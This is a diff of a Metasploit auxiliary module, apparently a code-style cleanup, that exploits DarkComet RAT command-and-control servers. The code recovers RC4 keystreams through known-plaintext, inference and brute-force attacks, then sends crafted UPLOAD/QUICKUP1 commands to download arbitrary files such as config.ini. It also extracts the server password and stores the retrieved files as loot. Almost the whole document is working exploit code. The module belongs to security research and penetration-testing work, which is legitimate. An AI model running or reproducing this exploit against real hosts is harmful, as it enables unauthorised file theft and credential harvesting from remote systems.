@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Auxiliary
       'References'     =>
         [
           [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf' ],
-          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ],
+          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ]
         ],
       'DisclosureDate' => 'Oct 08 2012',
       'Platform'       => 'win'
@@ -48,14 +48,14 @@ class MetasploitModule < Msf::Auxiliary
 
   # Functions for XORing two strings, deriving keystream using known plaintext and applying keystream to produce ciphertext
   def xor_strings(s1, s2)
-    s1.unpack('C*').zip(s2.unpack('C*')).map{ |a,b| a ^ b }.pack('C*')
+    s1.unpack('C*').zip(s2.unpack('C*')).map { |a, b| a ^ b }.pack('C*')
   end
 
   def get_keystream(ciphertext, known_plaintext)
     c = [ciphertext].pack('H*')
-    if (known_plaintext.length > c.length)
+    if known_plaintext.length > c.length
       return xor_strings(c, known_plaintext[0, c.length])
-    elsif (c.length > known_plaintext.length)
+    elsif c.length > known_plaintext.length
       return xor_strings(c[0, known_plaintext.length], known_plaintext)
     else
       return xor_strings(c, known_plaintext)
@@ -63,43 +63,43 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def use_keystream(plaintext, keystream)
-    if (keystream.length > plaintext.length)
-      ks_part = keystream[0, plaintext.length]
+    if keystream.length > plaintext.length
+      return xor_strings(plaintext, keystream[0, plaintext.length]).unpack('H*')[0].upcase
     else
-      ks_part = keystream
+      return xor_strings(plaintext, keystream).unpack('H*')[0].upcase
     end
-    return xor_strings(plaintext, ks_part).unpack('H*')[0].upcase
   end
 
   # Use RubyRC4 functionality (slightly modified from Max Prokopiev's implementation https://github.com/maxprokopiev/ruby-rc4/blob/master/lib/rc4.rb)
   # since OpenSSL requires at least 128-bit keys for RC4 while DarkComet supports any keylength
   def rc4_initialize(key)
-    @q1, @q2 = 0, 0
+    @q1 = 0
+    @q2 = 0
     @key = []
-    key.each_byte {|elem| @key << elem} while @key.size < 256
-    @key.slice!(256..@key.size-1) if @key.size >= 256
+    key.each_byte { |elem| @key << elem } while @key.size < 256
+    @key.slice!(256..@key.size - 1) if @key.size >= 256
     @s = (0..255).to_a
     j = 0
     0.upto(255) do |i|
-      j = (j + @s[i] + @key[i] )%256
+      j = (j + @s[i] + @key[i]) % 256
       @s[i], @s[j] = @s[j], @s[i]
     end
   end
 
   def rc4_keystream
-    @q1 = (@q1 + 1)%256
-    @q2 = (@q2 + @s[@q1])%256
+    @q1 = (@q1 + 1) % 256
+    @q2 = (@q2 + @s[@q1]) % 256
     @s[@q1], @s[@q2] = @s[@q2], @s[@q1]
-    @s[(@s[@q1]+@s[@q2])%256]
+    @s[(@s[@q1] + @s[@q2]) % 256]
   end
 
   def rc4_process(text)
-    text.each_byte.map {|i| (i ^ rc4_keystream).chr}.join
+    text.each_byte.map { |i| (i ^ rc4_keystream).chr }.join
   end
 
   def dc_encryptpacket(plaintext, key)
     rc4_initialize(key)
-    return rc4_process(plaintext).unpack('H*')[0].upcase
+    rc4_process(plaintext).unpack('H*')[0].upcase
   end
 
   # Try to execute the exploit
@@ -107,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
     connect
     idtype_msg = sock.get_once(12)
 
-    if (idtype_msg.length != 12)
+    if idtype_msg.length != 12
       disconnect
       return nil
     end
@@ -116,12 +116,12 @@ class MetasploitModule < Msf::Auxiliary
       exploit_msg = dc_encryptpacket(exploit_string, datastore['KEY'])
     else
       # If we don't have a key we need enough keystream
-      if keystream == nil
+      if keystream.nil?
         disconnect
         return nil
       end
 
-      if (keystream.length < exploit_string.length)
+      if keystream.length < exploit_string.length
         disconnect
         return nil
       end
@@ -142,98 +142,96 @@ class MetasploitModule < Msf::Auxiliary
       ack_msg = sock.get_once(3)
     end
 
-    if (ack_msg != "\x41\x00\x43")
+    if ack_msg != "\x41\x00\x43"
       disconnect
       return nil
-    else
-      # Different protocol structure for versions >= 5.1
-      if datastore['NEWVERSION'] == true
-        if bruting
-          begin
-            filelen = sock.timed_read(10, datastore['BRUTETIMEOUT']).to_i
-          rescue Timeout::Error
-            disconnect
-            return nil
-          end
-        else
-          filelen = sock.get_once(10).to_i
-        end
-        if (filelen == 0)
+    # Different protocol structure for versions >= 5.1
+    elsif datastore['NEWVERSION'] == true
+      if bruting
+        begin
+          filelen = sock.timed_read(10, datastore['BRUTETIMEOUT']).to_i
+        rescue Timeout::Error
           disconnect
           return nil
         end
-
-        if datastore['KEY'] != ''
-          a_msg = dc_encryptpacket('A', datastore['KEY'])
-        else
-          a_msg = use_keystream('A', keystream)
-        end
-
-        sock.put(a_msg)
-
-        if bruting
-          begin
-            filedata = sock.timed_read(filelen, datastore['BRUTETIMEOUT'])
-          rescue Timeout::Error
-            disconnect
-            return nil
-          end
-        else
-          filedata = sock.get_once(filelen)
-        end
-
-        if (filedata.length != filelen)
-          disconnect
-          return nil
-        end
-
-        sock.put(a_msg)
-        disconnect
-        return filedata
       else
-        filedata = ''
+        filelen = sock.get_once(10).to_i
+      end
+      if filelen == 0
+        disconnect
+        return nil
+      end
 
+      if datastore['KEY'] != ''
+        a_msg = dc_encryptpacket('A', datastore['KEY'])
+      else
+        a_msg = use_keystream('A', keystream)
+      end
+
+      sock.put(a_msg)
+
+      if bruting
+        begin
+          filedata = sock.timed_read(filelen, datastore['BRUTETIMEOUT'])
+        rescue Timeout::Error
+          disconnect
+          return nil
+        end
+      else
+        filedata = sock.get_once(filelen)
+      end
+
+      if filedata.length != filelen
+        disconnect
+        return nil
+      end
+
+      sock.put(a_msg)
+      disconnect
+      return filedata
+    else
+      filedata = ''
+
+      if bruting
+        begin
+          msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])
+        rescue Timeout::Error
+          disconnect
+          return nil
+        end
+      else
+        msg = sock.get_once(1024)
+      end
+
+      while (!msg.nil?) && (msg != '')
+        filedata += msg
         if bruting
           begin
             msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])
           rescue Timeout::Error
-            disconnect
-            return nil
+            break
           end
         else
           msg = sock.get_once(1024)
         end
+      end
 
-        while ((msg != nil) and (msg != '')) do
-          filedata += msg
-          if bruting
-            begin
-              msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])
-            rescue Timeout::Error
-              break
-            end
-          else
-            msg = sock.get_once(1024)
-          end
-        end
+      disconnect
 
-        disconnect
-
-        if (filedata == '')
-          return nil
-        else
-          return filedata
-        end
+      if filedata == ''
+        return nil
+      else
+        return filedata
       end
     end
   end
 
   # Fetch a GetSIN response from C2 server
-  def fetch_getsin()
+  def fetch_getsin
     connect
     idtype_msg = sock.get_once(12)
 
-    if (idtype_msg.length != 12)
+    if idtype_msg.length != 12
       disconnect
       return nil
     end
@@ -244,20 +242,20 @@ class MetasploitModule < Msf::Auxiliary
 
     getsin_msg = sock.get_once(1024)
     disconnect
-    return getsin_msg
+    getsin_msg
   end
 
   # Carry out the crypto attack when we don't have a key
   def crypto_attack(exploit_string)
-    getsin_msg = fetch_getsin()
-    if getsin_msg == nil
+    getsin_msg = fetch_getsin
+    if getsin_msg.nil?
       return nil
     end
 
     getsin_kp = 'GetSIN' + datastore['LHOST'] + '|'
     keystream = get_keystream(getsin_msg, getsin_kp)
 
-    if (keystream.length < exploit_string.length)
+    if keystream.length < exploit_string.length
       missing_bytecount = exploit_string.length - keystream.length
 
       print_status("Missing #{missing_bytecount} bytes of keystream ...")
@@ -265,7 +263,7 @@ class MetasploitModule < Msf::Auxiliary
       inferrence_segment = ''
       brute_max = 4
 
-      if (missing_bytecount > brute_max)
+      if missing_bytecount > brute_max
         print_status("Using inferrence attack ...")
 
         # Offsets to monitor for changes
@@ -279,31 +277,32 @@ class MetasploitModule < Msf::Auxiliary
 
         # As long as we haven't fully recovered all offsets through inference
         # We keep our observation window in a circular buffer with 4 slots with the buffer running between [head, tail]
-        getsin_observation = ['']*4
+        getsin_observation = [''] * 4
         buffer_head = 0
 
         for i in 0..2
-          getsin_observation[i] = [fetch_getsin()].pack('H*')
+          getsin_observation[i] = [fetch_getsin].pack('H*')
           Rex.sleep(0.5)
         end
 
         buffer_tail = 3
 
         # Actual inference attack happens here
-        while (target_offset_range.length != 0) do
-          getsin_observation[buffer_tail] = [fetch_getsin()].pack('H*')
+        while !target_offset_range.empty?
+          getsin_observation[buffer_tail] = [fetch_getsin].pack('H*')
           Rex.sleep(0.5)
 
-          # We check if we spot a change within a position between two consecutive items within our circular buffer (assuming preceding entries are static in that position) we observed a 'carry', ie. our observed position went from 9 to 0
+          # We check if we spot a change within a position between two consecutive items within our circular buffer
+          # (assuming preceding entries are static in that position) we observed a 'carry', ie. our observed position went from 9 to 0
           target_offset_range.each do |x|
             index = buffer_head
 
-            while (index != buffer_tail) do
+            while index != buffer_tail do
               next_index = (index + 1) % 4
 
               # The condition we impose is that observed character x has to differ between two observations and the character left of it has to differ in those same
               # observations as well while being constant in at least one previous or subsequent observation
-              if ((getsin_observation[index][x] != getsin_observation[next_index][x]) and (getsin_observation[index][x - 1] != getsin_observation[next_index][x - 1]) and ((getsin_observation[(index - 1) % 4][x - 1] == getsin_observation[index][x - 1]) or (getsin_observation[next_index][x - 1] == getsin_observation[(next_index + 1) % 4][x - 1])))
+              if (getsin_observation[index][x] != getsin_observation[next_index][x]) && (getsin_observation[index][x - 1] != getsin_observation[next_index][x - 1]) && ((getsin_observation[(index - 1) % 4][x - 1] == getsin_observation[index][x - 1]) || (getsin_observation[next_index][x - 1] == getsin_observation[(next_index + 1) % 4][x - 1]))
                 target_offset_range.delete(x)
                 inference_results[x] = xor_strings(getsin_observation[index][x], '9')
                 break
@@ -315,13 +314,13 @@ class MetasploitModule < Msf::Auxiliary
           # Update circular buffer head & tail
           buffer_tail = (buffer_tail + 1) % 4
           # Move head to right once tail wraps around, discarding oldest item in circular buffer
-          if (buffer_tail == buffer_head)
+          if buffer_tail == buffer_head
             buffer_head = (buffer_head + 1) % 4
           end
         end
 
         # Inferrence attack done, reconstruct final keystream segment
-        inf_seg = ["\x00"]*(keystream.length + missing_bytecount)
+        inf_seg = ["\x00"] * (keystream.length + missing_bytecount)
         inferrence_results.each do |x, val|
           inf_seg[x] = val
         end
@@ -330,7 +329,7 @@ class MetasploitModule < Msf::Auxiliary
         missing_bytecount = brute_max
       end
 
-      if (missing_bytecount > brute_max)
+      if missing_bytecount > brute_max
         print_status("Improper keystream recovery ...")
         return nil
       end
@@ -339,29 +338,29 @@ class MetasploitModule < Msf::Auxiliary
 
       # Bruteforce first missing_bytecount bytes of timestamp (maximum of brute_max)
       charset = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
-      char_range = missing_bytecount.times.map{ charset }
+      char_range = missing_bytecount.times.map { charset }
       char_range.first.product(*char_range[1..-1]) do |x|
         p = x.join
         candidate_plaintext = getsin_kp + p
         candidate_keystream = get_keystream(getsin_msg, candidate_plaintext) + inferrence_segment
         filedata = try_exploit(exploit_string, candidate_keystream, true)
 
-        if (filedata != nil)
+        if !filedata.nil?
           return filedata
         end
       end
       return nil
     end
 
-    return try_exploit(exploit_string, keystream, false)
+    try_exploit(exploit_string, keystream, false)
   end
 
   def parse_password(filedata)
     filedata.each_line { |line|
       elem = line.strip.split('=')
-      if (elem.length >= 1)
-        if (elem[0] == 'PASSWD')
-          if (elem.length == 2)
+      if elem.length >= 1
+        if elem[0] == 'PASSWD'
+          if elem.length == 2
             return elem[1]
           else
             return ''
@@ -375,17 +374,15 @@ class MetasploitModule < Msf::Auxiliary
   def run
     # Determine exploit string
     if datastore['NEWVERSION'] == true
-      if ((datastore['TARGETFILE'] != '') and (datastore['KEY'] != ''))
+      if (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
         exploit_string = 'QUICKUP1|' + datastore['TARGETFILE'] + '|'
       else
         exploit_string = 'QUICKUP1|config.ini|'
       end
+    elsif (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
+      exploit_string = 'UPLOAD' + datastore['TARGETFILE'] + '|1|1|'
     else
-      if ((datastore['TARGETFILE'] != '') and (datastore['KEY'] != ''))
-        exploit_string = 'UPLOAD' + datastore['TARGETFILE'] + '|1|1|'
-      else
-        exploit_string = 'UPLOADconfig.ini|1|1|'
-      end
+      exploit_string = 'UPLOADconfig.ini|1|1|'
     end
 
     # Run exploit
@@ -396,13 +393,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Harvest interesting credentials, store loot
-    if filedata == nil
-      print_status("Attack seems to have failed, no configfile data retrieved...")
-    else
+    if !filedata.nil?
       # Automatically try to extract password from config.ini if we haven't set a key yet
       if datastore['KEY'] == ''
         password = parse_password(filedata)
-        if password == nil
+        if password.nil?
           print_status("Could not find password in config.ini ...")
         elsif password == ''
           print_status("C2 server uses empty password!")
@@ -414,16 +409,16 @@ class MetasploitModule < Msf::Auxiliary
       # Store to loot
       if datastore['STORE_LOOT'] == true
         print_status("Storing data to loot...")
-        if ((datastore['KEY'] == '') and (datastore['TARGETFILE'] != ''))
+        if (datastore['KEY'] == '') && (datastore['TARGETFILE'] != '')
           store_loot("darkcomet.file", "text/plain", datastore['RHOST'], filedata, 'config.ini', "DarkComet C2 server config file")
         else
           store_loot("darkcomet.file", "text/plain", datastore['RHOST'], filedata, datastore['TARGETFILE'], "File retrieved from DarkComet C2 server")
         end
       else
-        print_status("#{filedata}")
+        print_status(filedata.to_s)
       end
+    else
+      print_status("Attack seems to have failed, no configfile data retrieved...")
     end
-
   end
-
 end
